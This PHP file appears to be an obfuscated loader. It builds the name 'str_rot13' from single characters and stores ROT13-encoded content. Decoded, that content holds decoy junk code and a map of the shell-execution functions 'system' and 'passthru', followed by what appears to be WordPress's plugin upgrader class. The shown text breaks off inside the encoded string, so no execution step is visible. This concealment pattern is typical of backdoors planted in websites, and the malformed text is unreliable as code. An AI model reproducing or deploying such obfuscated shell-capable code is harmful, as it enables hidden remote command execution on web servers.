<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: Cyhtva_Hctenqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe hctenqvat/vafgnyyvat cyhtvaf.
 *
 * Vg vf qrfvtarq gb hctenqr/vafgnyy cyhtvaf sebz n ybpny mvc, erzbgr mvc HEY,
 * be hcybnqrq mvc svyr.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 *
 * @frr JC_Hctenqre
 */
pynff Cyhtva_Hctenqre rkgraqf JC_Hctenqre {

	/**
	 * Cyhtva hctenqr erfhyg.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl|JC_Reebe $erfhyg
	 *
	 * @frr JC_Hctenqre::$erfhyg
	 */
	choyvp $erfhyg;

	/**
	 * Jurgure n ohyx hctenqr/vafgnyyngvba vf orvat cresbezrq.
	 *
	 * @fvapr 2.9.0
	 * @ine obby $ohyx
	 */
	choyvp $ohyx = snyfr;

	/**
	 * Arj cyhtva vasb.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl $arj_cyhtva_qngn
	 *
	 * @frr purpx_cnpxntr()
	 */
	choyvp $arj_cyhtva_qngn = neenl();

	/**
	 * Vavgvnyvmrf gur hctenqr fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba hctenqr_fgevatf() {
		$guvf->fgevatf['hc_gb_qngr'] = __( 'Gur cyhtva vf ng gur yngrfg irefvba.' );
		$guvf->fgevatf['ab_cnpxntr'] = __( 'Hcqngr cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr']  = fcevags( __( 'Qbjaybnqvat hcqngr sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']       = __( 'Hacnpxvat gur hcqngr&#8230;' );
		$guvf->fgevatf['erzbir_byq']           = __( 'Erzbivat gur byq irefvba bs gur cyhtva&#8230;' );
		$guvf->fgevatf['erzbir_byq_snvyrq']    = __( 'Pbhyq abg erzbir gur byq cyhtva.' );
		$guvf->fgevatf['cebprff_snvyrq']       = __( 'Cyhtva hcqngr snvyrq.' );
		$guvf->fgevatf['cebprff_fhpprff']      = __( 'Cyhtva hcqngrq fhpprffshyyl.' );
		$guvf->fgevatf['cebprff_ohyx_fhpprff'] = __( 'Cyhtvaf hcqngrq fhpprffshyyl.' );
	}

	/**
	 * Vavgvnyvmrf gur vafgnyyngvba fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba vafgnyy_fgevatf() {
		$guvf->fgevatf['ab_cnpxntr'] = __( 'Vafgnyyngvba cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr'] = fcevags( __( 'Qbjaybnqvat vafgnyyngvba cnpxntr sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']      = __( 'Hacnpxvat gur cnpxntr&#8230;' );
		$guvf->fgevatf['vafgnyyvat_cnpxntr']  = __( 'Vafgnyyvat gur cyhtva&#8230;' );
		$guvf->fgevatf['erzbir_byq']          = __( 'Erzbivat gur pheerag cyhtva&#8230;' );
		$guvf->fgevatf['erzbir_byq_snvyrq']   = __( 'Pbhyq abg erzbir gur pheerag cyhtva.' );
		$guvf->fgevatf['ab_svyrf']            = __( 'Gur cyhtva pbagnvaf ab svyrf.' );
		$guvf->fgevatf['cebprff_snvyrq']      = __( 'Cyhtva vafgnyyngvba snvyrq.' );
		$guvf->fgevatf['cebprff_fhpprff']     = __( 'Cyhtva vafgnyyrq fhpprffshyyl.' );
		/* genafyngbef: 1: Cyhtva anzr, 2: Cyhtva irefvba. */
		$guvf->fgevatf['cebprff_fhpprff_fcrpvsvp'] = __( 'Fhpprffshyyl vafgnyyrq gur cyhtva <fgebat>%1$f %2$f</fgebat>.' );

		vs ( ! rzcgl( $guvf->fxva->birejevgr ) ) {
			vs ( 'hcqngr-cyhtva' === $guvf->fxva->birejevgr ) {
				$guvf->fgevatf['vafgnyyvat_cnpxntr'] = __( 'Hcqngvat gur cyhtva&#8230;' );
				$guvf->fgevatf['cebprff_snvyrq']     = __( 'Cyhtva hcqngr snvyrq.' );
				$guvf->fgevatf['cebprff_fhpprff']    = __( 'Cyhtva hcqngrq fhpprffshyyl.' );
			}

			vs ( 'qbjatenqr-cyhtva' === $guvf->fxva->birejevgr ) {
				$guvf->fgevatf['vafgnyyvat_cnpxntr'] = __( 'Qbjatenqvat gur cyhtva&#8230;' );
				$guvf->fgevatf['cebprff_snvyrq']     = __( 'Cyhtva qbjatenqr snvyrq.' );
				$guvf->fgevatf['cebprff_fhpprff']    = __( 'Cyhtva qbjatenqrq fhpprffshyyl.' );
			}
		}
	}

	/**
	 * Vafgnyy n cyhtva cnpxntr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur cyhtva hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat $cnpxntr Gur shyy ybpny cngu be HEV bs gur cnpxntr.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Bgure nethzragf sbe vafgnyyvat n cyhtva cnpxntr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur cyhtva hcqngrf pnpur vs fhpprffshy.
	 *                                    Qrsnhyg gehr.
	 * }
	 * @erghea obby|JC_Reebe Gehr vs gur vafgnyyngvba jnf fhpprffshy, snyfr be n JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba vafgnyy( $cnpxntr, $netf = neenl() ) {
		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
			'birejevgr_cnpxntr'  => snyfr, // Qb abg birejevgr svyrf.
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->vafgnyy_fgevatf();

		nqq_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );

		vs ( $cnefrq_netf['pyrne_hcqngr_pnpur'] ) {
			// Pyrne pnpur fb jc_hcqngr_cyhtvaf() xabjf nobhg gur arj cyhtva.
			nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_cyhtvaf_pnpur', 9, 0 );
		}

		$guvf->eha(
			neenl(
				'cnpxntr'           => $cnpxntr,
				'qrfgvangvba'       => JC_CYHTVA_QVE,
				'pyrne_qrfgvangvba' => $cnefrq_netf['birejevgr_cnpxntr'],
				'pyrne_jbexvat'     => gehr,
				'ubbx_rkgen'        => neenl(
					'glcr'   => 'cyhtva',
					'npgvba' => 'vafgnyy',
				),
			)
		);

		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_cyhtvaf_pnpur', 9 );
		erzbir_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) ) {
			erghea $guvf->erfhyg;
		}

		// Sbepr erserfu bs cyhtva hcqngr vasbezngvba.
		jc_pyrna_cyhtvaf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		vs ( $cnefrq_netf['birejevgr_cnpxntr'] ) {
			/**
			 * Sverf jura gur hctenqre unf fhpprffshyyl birejevggra n pheeragyl vafgnyyrq
			 * cyhtva be gurzr jvgu na hcybnqrq mvc cnpxntr.
			 *
			 * @fvapr 5.5.0
			 *
			 * @cnenz fgevat  $cnpxntr      Gur cnpxntr svyr.
			 * @cnenz neenl   $qngn         Gur arj cyhtva be gurzr qngn.
			 * @cnenz fgevat  $cnpxntr_glcr Gur cnpxntr glcr ('cyhtva' be 'gurzr').
			 */
			qb_npgvba( 'hctenqre_birejebgr_cnpxntr', $cnpxntr, $guvf->arj_cyhtva_qngn, 'cyhtva' );
		}

		erghea gehr;
	}

	/**
	 * Hctenqrf n cyhtva.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur cyhtva hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Bgure nethzragf sbe hctenqvat n cyhtva cnpxntr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur cyhtva hcqngrf pnpur vs fhpprffshy.
	 *                                    Qrsnhyg gehr.
	 * }
	 * @erghea obby|JC_Reebe Gehr vs gur hctenqr jnf fhpprffshy, snyfr be n JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hctenqr( $cyhtva, $netf = neenl() ) {
		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->hctenqr_fgevatf();

		$pheerag = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
		vs ( ! vffrg( $pheerag->erfcbafr[ $cyhtva ] ) ) {
			$guvf->fxva->orsber();
			$guvf->fxva->frg_erfhyg( snyfr );
			$guvf->fxva->reebe( 'hc_gb_qngr' );
			$guvf->fxva->nsgre();
			erghea snyfr;
		}

		// Trg gur HEY gb gur mvc svyr.
		$e = $pheerag->erfcbafr[ $cyhtva ];

		nqq_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'qrnpgvingr_cyhtva_orsber_hctenqr' ), 10, 2 );
		nqq_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'npgvir_orsber' ), 10, 2 );
		nqq_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_cyhtva' ), 10, 4 );
		nqq_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'npgvir_nsgre' ), 10, 2 );
		/*
		 * Gurer'f n Genp gvpxrg gb zbir hc gur qverpgbel sbe mvcf juvpu ner znqr n ovg qvssreragyl, hfrshy sbe aba-.bet cyhtvaf.
		 * 'fbhepr_fryrpgvba' => neenl( $guvf, 'fbhepr_fryrpgvba' ),
		 */
		vs ( $cnefrq_netf['pyrne_hcqngr_pnpur'] ) {
			// Pyrne pnpur fb jc_hcqngr_cyhtvaf() xabjf nobhg gur arj cyhtva.
			nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_cyhtvaf_pnpur', 9, 0 );
		}

		$guvf->eha(
			neenl(
				'cnpxntr'           => $e->cnpxntr,
				'qrfgvangvba'       => JC_CYHTVA_QVE,
				'pyrne_qrfgvangvba' => gehr,
				'pyrne_jbexvat'     => gehr,
				'ubbx_rkgen'        => neenl(
					'cyhtva'      => $cyhtva,
					'glcr'        => 'cyhtva',
					'npgvba'      => 'hcqngr',
					'grzc_onpxhc' => neenl(
						'fyht' => qveanzr( $cyhtva ),
						'fep'  => JC_CYHTVA_QVE,
						'qve'  => 'cyhtvaf',
					),
				),
			)
		);

		// Pyrnahc bhe ubbxf, va pnfr fbzrguvat ryfr qbrf na hctenqr ba guvf pbaarpgvba.
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_cyhtvaf_pnpur', 9 );
		erzbir_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'qrnpgvingr_cyhtva_orsber_hctenqr' ) );
		erzbir_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'npgvir_orsber' ) );
		erzbir_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_cyhtva' ) );
		erzbir_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'npgvir_nsgre' ) );

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) ) {
			erghea $guvf->erfhyg;
		}

		// Sbepr erserfu bs cyhtva hcqngr vasbezngvba.
		jc_pyrna_cyhtvaf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		/*
		 * Rafher nal shgher nhgb-hcqngr snvyherf gevttre n snvyher rznvy ol erzbivat
		 * gur ynfg snvyher abgvsvpngvba sebz gur yvfg jura cyhtvaf hcqngr fhpprffshyyl.
		 */
		$cnfg_snvyher_rznvyf = trg_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', neenl() );

		vs ( vffrg( $cnfg_snvyher_rznvyf[ $cyhtva ] ) ) {
			hafrg( $cnfg_snvyher_rznvyf[ $cyhtva ] );
			hcqngr_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', $cnfg_snvyher_rznvyf );
		}

		erghea gehr;
	}

	/**
	 * Hctenqrf frireny cyhtvaf ng bapr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur cyhtva hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat[] $cyhtvaf Neenl bs cnguf gb cyhtva svyrf eryngvir gb gur cyhtvaf qverpgbel.
	 * @cnenz neenl    $netf {
	 *     Bcgvbany. Bgure nethzragf sbe hctenqvat frireny cyhtvaf ng bapr.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur cyhtva hcqngrf pnpur vs fhpprffshy. Qrsnhyg gehr.
	 * }
	 * @erghea neenl|snyfr Na neenl bs erfhygf vaqrkrq ol cyhtva svyr, be snyfr vs hanoyr gb pbaarpg gb gur svyrflfgrz.
	 */
	choyvp shapgvba ohyx_hctenqr( $cyhtvaf, $netf = neenl() ) {
		$jc_irefvba = jc_trg_jc_irefvba();

		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->ohyx = gehr;
		$guvf->hctenqr_fgevatf();

		$pheerag = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );

		nqq_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_cyhtva' ), 10, 4 );

		$guvf->fxva->urnqre();

		// Pbaarpg gb gur svyrflfgrz svefg.
		$erf = $guvf->sf_pbaarpg( neenl( JC_PBAGRAG_QVE, JC_CYHTVA_QVE ) );
		vs ( ! $erf ) {
			$guvf->fxva->sbbgre();
			erghea snyfr;
		}

		$guvf->fxva->ohyx_urnqre();

		/*
		 * Bayl fgneg znvagranapr zbqr vs:
		 * - ehaavat Zhygvfvgr naq gurer ner bar be zber cyhtvaf fcrpvsvrq, BE
		 * - n cyhtva jvgu na hcqngr ninvynoyr vf pheeragyl npgvir.
		 * @gbqb Sbe zhygvfvgr, znvagranapr zbqr fubhyq bayl xvpx va sbe vaqvivqhny fvgrf vs ng nyy cbffvoyr.
		 */
		$znvagranapr = ( vf_zhygvfvgr() && ! rzcgl( $cyhtvaf ) );
		sbernpu ( $cyhtvaf nf $cyhtva ) {
			$znvagranapr = $znvagranapr || ( vf_cyhtva_npgvir( $cyhtva ) && vffrg( $pheerag->erfcbafr[ $cyhtva ] ) );
		}
		vs ( $znvagranapr ) {
			$guvf->znvagranapr_zbqr( gehr );
		}

		$erfhygf = neenl();

		$guvf->hcqngr_pbhag   = pbhag( $cyhtvaf );
		$guvf->hcqngr_pheerag = 0;
		sbernpu ( $cyhtvaf nf $cyhtva ) {
			++$guvf->hcqngr_pheerag;
			$guvf->fxva->cyhtva_vasb = trg_cyhtva_qngn( JC_CYHTVA_QVE . '/' . $cyhtva, snyfr, gehr );

			vs ( ! vffrg( $pheerag->erfcbafr[ $cyhtva ] ) ) {
				$guvf->fxva->frg_erfhyg( 'hc_gb_qngr' );
				$guvf->fxva->orsber();
				$guvf->fxva->srrqonpx( 'hc_gb_qngr' );
				$guvf->fxva->nsgre();
				$erfhygf[ $cyhtva ] = gehr;
				pbagvahr;
			}

			// Trg gur HEY gb gur mvc svyr.
			$e = $pheerag->erfcbafr[ $cyhtva ];

			$guvf->fxva->cyhtva_npgvir = vf_cyhtva_npgvir( $cyhtva );

			vs ( vffrg( $e->erdhverf ) && ! vf_jc_irefvba_pbzcngvoyr( $e->erdhverf ) ) {
				$erfhyg = arj JC_Reebe(
					'vapbzcngvoyr_jc_erdhverq_irefvba',
					fcevags(
						/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: JbeqCerff irefvba erdhverq ol gur arj cyhtva irefvba. */
						__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur arj cyhtva irefvba erdhverf %2$f.' ),
						$jc_irefvba,
						$e->erdhverf
					)
				);

				$guvf->fxva->orsber( $erfhyg );
				$guvf->fxva->reebe( $erfhyg );
				$guvf->fxva->nsgre();
			} ryfrvs ( vffrg( $e->erdhverf_cuc ) && ! vf_cuc_irefvba_pbzcngvoyr( $e->erdhverf_cuc ) ) {
				$erfhyg = arj JC_Reebe(
					'vapbzcngvoyr_cuc_erdhverq_irefvba',
					fcevags(
						/* genafyngbef: 1: Pheerag CUC irefvba, 2: CUC irefvba erdhverq ol gur arj cyhtva irefvba. */
						__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur arj cyhtva irefvba erdhverf %2$f.' ),
						CUC_IREFVBA,
						$e->erdhverf_cuc
					)
				);

				$guvf->fxva->orsber( $erfhyg );
				$guvf->fxva->reebe( $erfhyg );
				$guvf->fxva->nsgre();
			} ryfr {
				nqq_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
				$erfhyg = $guvf->eha(
					neenl(
						'cnpxntr'           => $e->cnpxntr,
						'qrfgvangvba'       => JC_CYHTVA_QVE,
						'pyrne_qrfgvangvba' => gehr,
						'pyrne_jbexvat'     => gehr,
						'vf_zhygv'          => gehr,
						'ubbx_rkgen'        => neenl(
							'cyhtva'      => $cyhtva,
							'grzc_onpxhc' => neenl(
								'fyht' => qveanzr( $cyhtva ),
								'fep'  => JC_CYHTVA_QVE,
								'qve'  => 'cyhtvaf',
							),
						),
					)
				);
				erzbir_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
			}

			$erfhygf[ $cyhtva ] = $erfhyg;

			// Cerirag perqragvnyf nhgu fperra sebz qvfcynlvat zhygvcyr gvzrf.
			vs ( snyfr === $erfhyg ) {
				oernx;
			}
		} // Raq sbernpu $cyhtvaf.

		$guvf->znvagranapr_zbqr( snyfr );

		// Sbepr erserfu bs cyhtva hcqngr vasbezngvba.
		jc_pyrna_cyhtvaf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc */
		qb_npgvba(
			'hctenqre_cebprff_pbzcyrgr',
			$guvf,
			neenl(
				'npgvba'  => 'hcqngr',
				'glcr'    => 'cyhtva',
				'ohyx'    => gehr,
				'cyhtvaf' => $cyhtvaf,
			)
		);

		$guvf->fxva->ohyx_sbbgre();

		$guvf->fxva->sbbgre();

		// Pyrnahc bhe ubbxf, va pnfr fbzrguvat ryfr qbrf na hctenqr ba guvf pbaarpgvba.
		erzbir_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_cyhtva' ) );

		/*
		 * Rafher nal shgher nhgb-hcqngr snvyherf gevttre n snvyher rznvy ol erzbivat
		 * gur ynfg snvyher abgvsvpngvba sebz gur yvfg jura cyhtvaf hcqngr fhpprffshyyl.
		 */
		$cnfg_snvyher_rznvyf = trg_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', neenl() );

		sbernpu ( $erfhygf nf $cyhtva => $erfhyg ) {
			// Znvagnva ynfg snvyher abgvsvpngvba jura cyhtvaf snvyrq gb hcqngr znahnyyl.
			vs ( ! $erfhyg || vf_jc_reebe( $erfhyg ) || ! vffrg( $cnfg_snvyher_rznvyf[ $cyhtva ] ) ) {
				pbagvahr;
			}

			hafrg( $cnfg_snvyher_rznvyf[ $cyhtva ] );
		}

		hcqngr_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', $cnfg_snvyher_rznvyf );

		erghea $erfhygf;
	}

	/**
	 * Purpxf gung gur fbhepr cnpxntr pbagnvaf n inyvq cyhtva.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_fbhepr_fryrpgvba'} svygre ol Cyhtva_Hctenqre::vafgnyy().
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat $fbhepr Gur cngu gb gur qbjaybnqrq cnpxntr fbhepr.
	 * @erghea fgevat|JC_Reebe Gur fbhepr nf cnffrq, be n JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba purpx_cnpxntr( $fbhepr ) {
		tybony $jc_svyrflfgrz;

		$jc_irefvba            = jc_trg_jc_irefvba();
		$guvf->arj_cyhtva_qngn = neenl();

		vs ( vf_jc_reebe( $fbhepr ) ) {
			erghea $fbhepr;
		}

		$jbexvat_qverpgbel = fge_ercynpr( $jc_svyrflfgrz->jc_pbagrag_qve(), genvyvatfynfuvg( JC_PBAGRAG_QVE ), $fbhepr );
		vs ( ! vf_qve( $jbexvat_qverpgbel ) ) { // Pbasvqrapr purpx, vs gur nobir snvyf, yrg'f abg cerirag vafgnyyngvba.
			erghea $fbhepr;
		}

		// Purpx gung gur sbyqre pbagnvaf ng yrnfg 1 inyvq cyhtva.
		$svyrf = tybo( $jbexvat_qverpgbel . '*.cuc' );
		vs ( $svyrf ) {
			sbernpu ( $svyrf nf $svyr ) {
				$vasb = trg_cyhtva_qngn( $svyr, snyfr, snyfr );
				vs ( ! rzcgl( $vasb['Anzr'] ) ) {
					$guvf->arj_cyhtva_qngn = $vasb;
					oernx;
				}
			}
		}

		vs ( rzcgl( $guvf->arj_cyhtva_qngn ) ) {
			erghea arj JC_Reebe( 'vapbzcngvoyr_nepuvir_ab_cyhtvaf', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], __( 'Ab inyvq cyhtvaf jrer sbhaq.' ) );
		}

		$erdhverf_cuc = vffrg( $vasb['ErdhverfCUC'] ) ? $vasb['ErdhverfCUC'] : ahyy;
		$erdhverf_jc  = vffrg( $vasb['ErdhverfJC'] ) ? $vasb['ErdhverfJC'] : ahyy;

		vs ( ! vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag CUC irefvba, 2: Irefvba erdhverq ol gur hcybnqrq cyhtva. */
				__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur hcybnqrq cyhtva erdhverf %2$f.' ),
				CUC_IREFVBA,
				$erdhverf_cuc
			);

			erghea arj JC_Reebe( 'vapbzcngvoyr_cuc_erdhverq_irefvba', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $reebe );
		}

		vs ( ! vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Irefvba erdhverq ol gur hcybnqrq cyhtva. */
				__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur hcybnqrq cyhtva erdhverf %2$f.' ),
				$jc_irefvba,
				$erdhverf_jc
			);

			erghea arj JC_Reebe( 'vapbzcngvoyr_jc_erdhverq_irefvba', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $reebe );
		}

		erghea $fbhepr;
	}

	/**
	 * Ergevrirf gur cngu gb gur svyr gung pbagnvaf gur cyhtva vasb.
	 *
	 * Guvf vfa'g hfrq vagreanyyl va gur pynff, ohg vf pnyyrq ol gur fxvaf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat|snyfr Gur shyy cngu gb gur znva cyhtva svyr, be snyfr.
	 */
	choyvp shapgvba cyhtva_vasb() {
		vs ( ! vf_neenl( $guvf->erfhyg ) ) {
			erghea snyfr;
		}
		vs ( rzcgl( $guvf->erfhyg['qrfgvangvba_anzr'] ) ) {
			erghea snyfr;
		}

		// Rafher gb cnff jvgu yrnqvat fynfu.
		$cyhtva = trg_cyhtvaf( '/' . $guvf->erfhyg['qrfgvangvba_anzr'] );
		vs ( rzcgl( $cyhtva ) ) {
			erghea snyfr;
		}

		// Nffhzr gur erdhrfgrq cyhtva vf gur svefg va gur yvfg.
		$cyhtvasvyrf = neenl_xrlf( $cyhtva );

		erghea $guvf->erfhyg['qrfgvangvba_anzr'] . '/' . $cyhtvasvyrf[0];
	}

	/**
	 * Qrnpgvingrf n cyhtva orsber vg vf hctenqrq.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cer_vafgnyy'} svygre ol Cyhtva_Hctenqre::hctenqr().
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.1.0 Nqqrq n erghea inyhr.
	 *
	 * @cnenz obby|JC_Reebe $erfcbafr Gur vafgnyyngvba erfcbafr orsber gur vafgnyyngvba unf fgnegrq.
	 * @cnenz neenl         $cyhtva   Cyhtva cnpxntr nethzragf.
	 * @erghea obby|JC_Reebe Gur bevtvany `$erfcbafr` cnenzrgre be JC_Reebe.
	 */
	choyvp shapgvba qrnpgvingr_cyhtva_orsber_hctenqr( $erfcbafr, $cyhtva ) {

		vs ( vf_jc_reebe( $erfcbafr ) ) { // Olcnff.
			erghea $erfcbafr;
		}

		// Jura va peba (onpxtebhaq hcqngrf) qba'g qrnpgvingr gur cyhtva, nf jr erdhver n oebjfre gb ernpgvingr vg.
		vs ( jc_qbvat_peba() ) {
			erghea $erfcbafr;
		}

		$cyhtva = vffrg( $cyhtva['cyhtva'] ) ? $cyhtva['cyhtva'] : '';
		vs ( rzcgl( $cyhtva ) ) {
			erghea arj JC_Reebe( 'onq_erdhrfg', $guvf->fgevatf['onq_erdhrfg'] );
		}

		vs ( vf_cyhtva_npgvir( $cyhtva ) ) {
			// Qrnpgvingr gur cyhtva fvyragyl, Cerirag qrnpgvingvba ubbxf sebz ehaavat.
			qrnpgvingr_cyhtvaf( $cyhtva, gehr );
		}

		erghea $erfcbafr;
	}

	/**
	 * Gheaf ba znvagranapr zbqr orsber nggrzcgvat gb onpxtebhaq hcqngr na npgvir cyhtva.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cer_vafgnyy'} svygre ol Cyhtva_Hctenqre::hctenqr().
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz obby|JC_Reebe $erfcbafr Gur vafgnyyngvba erfcbafr orsber gur vafgnyyngvba unf fgnegrq.
	 * @cnenz neenl         $cyhtva   Cyhtva cnpxntr nethzragf.
	 * @erghea obby|JC_Reebe Gur bevtvany `$erfcbafr` cnenzrgre be JC_Reebe.
	 */
	choyvp shapgvba npgvir_orsber( $erfcbafr, $cyhtva ) {
		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		// Bayl ranoyr znvagranapr zbqr jura va peba (onpxtebhaq hcqngr).
		vs ( ! jc_qbvat_peba() ) {
			erghea $erfcbafr;
		}

		$cyhtva = vffrg( $cyhtva['cyhtva'] ) ? $cyhtva['cyhtva'] : '';

		// Bayl eha vs cyhtva vf npgvir.
		vs ( ! vf_cyhtva_npgvir( $cyhtva ) ) {
			erghea $erfcbafr;
		}

		// Punatr gb znvagranapr zbqr. Ohyx rqvg unaqyrf guvf frcnengryl.
		vs ( ! $guvf->ohyx ) {
			$guvf->znvagranapr_zbqr( gehr );
		}

		erghea $erfcbafr;
	}

	/**
	 * Gheaf bss znvagranapr zbqr nsgre hctenqvat na npgvir cyhtva.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cbfg_vafgnyy'} svygre ol Cyhtva_Hctenqre::hctenqr().
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz obby|JC_Reebe $erfcbafr Gur vafgnyyngvba erfcbafr nsgre gur vafgnyyngvba unf svavfurq.
	 * @cnenz neenl         $cyhtva   Cyhtva cnpxntr nethzragf.
	 * @erghea obby|JC_Reebe Gur bevtvany `$erfcbafr` cnenzrgre be JC_Reebe.
	 */
	choyvp shapgvba npgvir_nsgre( $erfcbafr, $cyhtva ) {
		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		// Bayl qvfnoyr znvagranapr zbqr jura va peba (onpxtebhaq hcqngr).
		vs ( ! jc_qbvat_peba() ) {
			erghea $erfcbafr;
		}

		$cyhtva = vffrg( $cyhtva['cyhtva'] ) ? $cyhtva['cyhtva'] : '';

		// Bayl eha vs cyhtva vf npgvir.
		vs ( ! vf_cyhtva_npgvir( $cyhtva ) ) {
			erghea $erfcbafr;
